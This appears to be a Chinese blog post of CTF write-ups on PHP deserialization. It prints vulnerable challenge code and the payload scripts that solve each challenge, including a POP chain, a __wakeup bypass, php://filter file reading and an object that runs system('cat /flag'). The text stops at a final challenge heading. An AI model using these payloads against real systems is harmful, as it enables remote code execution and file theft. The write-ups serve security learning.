<p>—call（），在对象中调用一个不可以访问方法时调用<br>——callStatic(),用静态方式中调用一个不可以访问方法时调用<br>这里的静态与动态：静态方法指的是用 static 关键字声明的类方法，可以不实例化对象就直接调用<br>这里给的一个参数如果是数组，应该算做静态。不对<br>静态看的是你传的这个东西有没有实例化，有的就不是静态了<br>-toString(),类被当成字符串时的回应方法<br>-invoke(),调用函数的方式调用一个对象时的回应方法<br>下面四个都很少遇见</p>
<h2 id="get-获得一个类的成员变量时调用"><a href="#get-获得一个类的成员变量时调用" class="headerlink" title="-get(),获得一个类的成员变量时调用"></a>-get(),获得一个类的成员变量时调用</h2><p>用于读取类中未定义或不可访问属性时被自动调用<br>或者访问该类的属性不存在<br>就是对于某类的属性是private或者protected时触发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">private $data = [</span><br><span class="line">&#x27;name&#x27; =&gt; &#x27;Alice&#x27;,</span><br><span class="line">&#x27;email&#x27; =&gt; &#x27;alice@example.com&#x27;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">public function __get($property) &#123;</span><br><span class="line">echo &quot;__get 被调用：尝试访问 &#x27;$property&#x27;\n&quot;;</span><br><span class="line">if (array_key_exists($property, $this-&gt;data)) &#123;</span><br><span class="line">return $this-&gt;data[$property];</span><br><span class="line">&#125;</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = new User();</span><br><span class="line">echo $user-&gt;name;   // 触发 __get()，输出 Alice</span><br><span class="line">echo $user-&gt;age;    // 触发 __get()，输出 null</span><br><span class="line">结果：__get 被调用：尝试访问 &#x27;name&#x27;</span><br><span class="line">Alice__get 被调用：尝试访问 &#x27;age&#x27;</span><br></pre></td></tr></table></figure>
<p>-isset(),当对不可访问属性调用isset()或empty()时调用<br>-set(),设置一个类的成员变量时调用<br>-unset(),当对不可访问属性调用unset()时被调用<br>ok，开始来做题</p>
<h1 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h1><p>1分<br>反序列化PHPJava反序列化<br>一进去看源码得知要看robots.txt<br>访问，回显：Disallow: &#x2F;cl45s.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($p);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>有一个反序列化的题目,构造payload拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;admin = &quot;admin&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;ctf&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = new wllm();</span><br><span class="line">echo serialize($p);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<h1 id="SWPUCTF-2021-新生赛-no-wakeup"><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h1><p>1分<br>反序列化PHPJava反序列化<br>点进去一下，源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;class.php&quot;);</span><br><span class="line"></span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$Letmeseesee = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($Letmeseesee);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>很简单，构造paylaod再cve方法绕过wakeup</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HaHaHa</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;admin = &quot;admin&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;wllm&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Letmeseesee = new HaHaHa();</span><br><span class="line">echo serialize($Letmeseesee);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>1分<br>反序列化PHP伪协议PHP<br>一进去又给出了源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>我们一开始需要进入if true的代码块里面，需要采用data:&#x2F;&#x2F;协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data://协议</span><br><span class="line">需要allow_url_fopen,allow_url_include均为on</span><br><span class="line"></span><br><span class="line">这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">text/plain，表示的是文本</span><br><span class="line"></span><br><span class="line">text/plain;base64, 若纯文本没用可用base64编码</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里我们选用纯文本模式：text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf<br>结合源码，我们构造paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
<p>这里读到了useless.php源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
<p>这里我们就借助反序列化还剩的一个变量来拿flag<br>这里能够拿flag的原理就是，useless.php文件里面是__tostring()<br>然后刚才我们的源码就是刚好有echo</p>
<h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>1分<br>反序列化PHP代码审计<br>一进来也是给了源码，其他的几乎什么也是没有的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>整体链子也是很简单，基本一下子就可以出来了<br>还有就是注意protected受保护属性序列化时，在变量名面前加上“%00*%00”,后面就没有加了<br>private私有属性序列化时，会在pub名字前加类名test,testpub明明是7个，为什么会是九个呢？在变量名面前加”%00类名（test）%00pub”;这样就是九个了</p>
<p>构造paylaod拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line"></span><br><span class="line">//    public function Getflag()&#123;</span><br><span class="line">//        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">//            include(&#x27;flag.php&#x27;);</span><br><span class="line">//            echo $flag;</span><br><span class="line">//        &#125;else&#123;</span><br><span class="line">//            echo $this-&gt;admin;</span><br><span class="line">//            echo $this-&gt;passwd;</span><br><span class="line">//            echo &#x27;nono&#x27;;</span><br><span class="line">//        &#125;</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">//    public function __destruct()&#123;</span><br><span class="line">//        echo $this-&gt;w00m;</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m = &#x27;Getflag&#x27;;</span><br><span class="line">//    public function __toString()&#123;</span><br><span class="line">//        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">//        return 0;</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = new w22m();</span><br><span class="line">$w00m-&gt;w00m = new w33m();</span><br><span class="line">$w00m-&gt;w00m-&gt;w00m = new w44m();</span><br><span class="line">$a = serialize($w00m);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<h1 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h1><p>1分<br>反序列化弱比较PHP<br>一进去就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;this_is_secret&quot;; </span><br><span class="line">$password  = &quot;this_is_not_known_to_you&quot;; </span><br><span class="line">include(&quot;flag.php&quot;);//here I changed those two </span><br><span class="line">$info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($info);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">username or password error!</span><br></pre></td></tr></table></figure>
<p>这个源码就显示的非常奇怪，注意弱等于，然后就是我们稍微构造一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ab=array(</span><br><span class="line">    &#x27;username&#x27;=&gt;true,</span><br><span class="line">	&#x27;password&#x27;=&gt;true</span><br><span class="line">);</span><br><span class="line">$b=serialize($ab);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
<p>最后拿到flag</p>
<h1 id="SWPUCTF-2022-新生赛-1z-unserialize"><a href="#SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]1z_unserialize"></a>[SWPUCTF 2022 新生赛]1z_unserialize</h1><p>1分<br>反序列化PHPRCE<br>题目描述</p>
<p>是很简单的反序列化噢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class lyh&#123;</span><br><span class="line">    public $url = &#x27;NSSCTF.com&#x27;;</span><br><span class="line">    public $lt;</span><br><span class="line">    public $lly;</span><br><span class="line">     </span><br><span class="line">     function  __destruct()</span><br><span class="line">     &#123;</span><br><span class="line">        $a = $this-&gt;lt;</span><br><span class="line"></span><br><span class="line">        $a($this-&gt;lly);</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">unserialize($_POST[&#x27;nss&#x27;]);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>一进去就是源码,简单构造源码来拿到flag，很简单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class lyh&#123;</span><br><span class="line">    public $url = &#x27;NSSCTF.com&#x27;;</span><br><span class="line">    public $lt = &#x27;system&#x27;;</span><br><span class="line">    public $lly = &#x27;cat /flag&#x27;;</span><br><span class="line"></span><br><span class="line">    function  __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $a = $this-&gt;lt;</span><br><span class="line"></span><br><span class="line">        $a($this-&gt;lly);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new lyh();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h1 id="SWPUCTF-2022-新生赛-ez-ez-unserialize"><a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_unserialize"></a>[SWPUCTF 2022 新生赛]ez_ez_unserialize</h1><p>1分<br>反序列化PHPRCE<br>一进去也是源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class X</span><br><span class="line">&#123;</span><br><span class="line">    public $x = __FILE__;</span><br><span class="line">    function __construct($x)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;x = $x;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;x !== __FILE__) &#123;</span><br><span class="line">            $this-&gt;x = __FILE__;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        highlight_file($this-&gt;x);</span><br><span class="line">        //flag is in fllllllag.php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_REQUEST[&#x27;x&#x27;])) &#123;</span><br><span class="line">    @unserialize($_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>也是很简单的，paylaod也很简答，加上一个cve的wakeup漏洞的绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class X</span><br><span class="line">&#123;</span><br><span class="line">    public $x = &#x27;fllllllag.php&#x27;;</span><br><span class="line">    function __construct($x)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;x = $x;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;x !== __FILE__) &#123;</span><br><span class="line">            $this-&gt;x = __FILE__;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        highlight_file($this-&gt;x);</span><br><span class="line">        //flag is in fllllllag.php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new X(&#x27;fllllllag.php&#x27;);</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
<p>当然，我也只是知道具体的思路，那个系统的自动填补帮助我了一下，然后就出flag了</p>
<h1 id="NISACTF-2022-babyserialize"><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1><p>1分<br>反序列化PHPRCE<br>一进去也是源码</p>
